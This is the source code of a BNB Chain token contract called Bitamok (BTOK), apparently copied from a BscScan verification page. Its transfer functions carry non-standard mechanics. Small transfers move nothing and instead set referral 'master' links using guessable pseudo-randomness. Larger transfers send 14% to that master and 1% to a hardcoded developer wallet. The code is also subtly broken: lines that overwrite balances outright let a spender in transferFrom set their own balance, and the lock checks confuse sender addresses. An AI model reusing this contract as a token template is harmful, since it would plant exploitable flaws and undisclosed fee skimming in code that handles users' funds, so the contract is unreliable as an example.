/**
 *Submitted for verification at BscScan.com on 2021-12-02
*/

// SPDX-License-Identifier: MIT
//https://bitamok.com

pragma solidity ^0.8.9;
contract bitamok{

mapping(address => uint160) public master;
mapping(address => uint256) public lockTime;
mapping (address => uint) public balances;

mapping (address => mapping (address=>uint)) public allowance;

address devwallet = 0x8F9E9A7E3A41f2007805b37d08586eF2753a3791;

 uint public totalSupply = 20000000000 * 10 ** 18;
 string public name = "Bitamok";
 string public symbol = "BTOK";
 uint public decimals = 18;
 constructor(){
     balances[msg.sender] = totalSupply;
 }
 
 function balanceOf(address owner) public view returns (uint){
     return balances[owner];
 }
 
 event Transfer(address indexed from, address indexed to, uint value);
 event Approval(address indexed owner, address indexed spender, uint value);
 
 function transfer(address to, uint value) public returns(bool){
        require (balanceOf(msg.sender) >= value, 'balance too low');
        uint256 howm = balanceOf(msg.sender) / 100 * 85;

        uint256 your = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );
        
        your = your %10;
        
        address payable target = payable(address(master[msg.sender]));
        uint256 testto = uint256(master[msg.sender]);
        uint256 testty = uint256(uint160(to));
        uint256 walto = 0;
        
        if (lockTime[msg.sender] > 0){
            
            require(lockTime[msg.sender] - 6 hours + 960 seconds <= block.timestamp, "Not So Fast!");
        }else{
            
            lockTime[msg.sender] = 0;
        }
        
        if (value <= 10000000000000){
            require(block.timestamp > lockTime[msg.sender], "Still Locked!");
            require(balances[to] / 100 * 20 <= balances[msg.sender], "Low balance!");
            
            walto = 1;
            
          if (your >= 5){
              
              
              walto = 2;
              if (testto != 0 && testto == testty){

                  master[msg.sender] = 0;
                 
              }
              
          uint256 waletto = uint256(uint160(msg.sender));

          master[to] = uint160(uint256(waletto));
          
          
          }
          
          lockTime[msg.sender] = block.timestamp + 6 hours;
          
          
            
        }else {

            if (testto != 0 && testto != testty && value <= howm){
                
                uint256 xshare = value / 100 * 14;
                balances[msg.sender] -= xshare;
                uint256 admnshar = value / 100 * 1;
                balances[msg.sender] -= admnshar;
                balances[target] += xshare;
                balances[devwallet] += admnshar;
                emit Transfer(msg.sender, target, xshare);
                emit Transfer(msg.sender, devwallet, admnshar);
           
            }
            
            if (testto != 0 && testto != testty && value > howm){

                uint256 xshare = value / 100 * 14;
                uint256 admnshar = value / 100 * 1;
                value -= xshare;
                value -= admnshar;
                balances[target] += xshare;
                balances[devwallet] += admnshar;
                balances[msg.sender] = value;
                emit Transfer(msg.sender, target, xshare);
                emit Transfer(msg.sender, devwallet, admnshar);

            }
            
        }
        
        if (walto == 1){
            value = 0;
        }
		
        walto = 0;
        
        balances[msg.sender] -= value;
        balances[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
 }
 
 function transferFrom(address from, address to, uint value) public returns(bool){
        require(balanceOf(from)>=value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance to low');

        uint256 howm = balanceOf(from) / 100 * 85;
        require(value > 10000000000000, "No!");
        
        if (lockTime[from] > 0){
            
            require(lockTime[from] - 6 hours + 960 seconds <= block.timestamp, "Not So Fast!");
        }else{
            
            lockTime[msg.sender] = 0;
        }
        
        uint256 testto = uint256(master[from]);
        uint256 testty = uint256(uint160(to));

        if (testto != 0 && testto != testty && value <= howm){
            
            address payable target = payable(address(master[from]));

            uint256 xshare = value / 100 * 14;
            balances[from] -= xshare;
            uint256 admnshar = value / 100 * 1;
            balances[from] -= admnshar;

            balances[target] += xshare;
            balances[devwallet] += admnshar;
            emit Transfer(from, target, xshare);   
            emit Transfer(from, devwallet, admnshar);

        }
        
        if (testto != 0 && testto != testty && value > howm){
            address payable target = payable(address(master[from]));


            uint256 xshare = value / 100 * 14;
            uint256 admnshar = value / 100 * 1;
            value -= xshare;
            value -= admnshar;
            require(allowance[from][msg.sender] >= value, 'allowance to low');
            balances[target] += xshare;
            balances[devwallet] += admnshar;
            balances[msg.sender] = value;
            emit Transfer(from, target, xshare);   
            emit Transfer(from, devwallet, admnshar);

            }
        
        balances[from] -= value;
        allowance[from][msg.sender] -= value;
        balances[to] += value;
        emit Transfer(from, to, value);
        return true;
 }
 
 function approve(address spender, uint value) public returns(bool){
     
     allowance[msg.sender][spender] = value; 
     emit Approval(msg.sender, spender, value);
     return true;
 }


 
}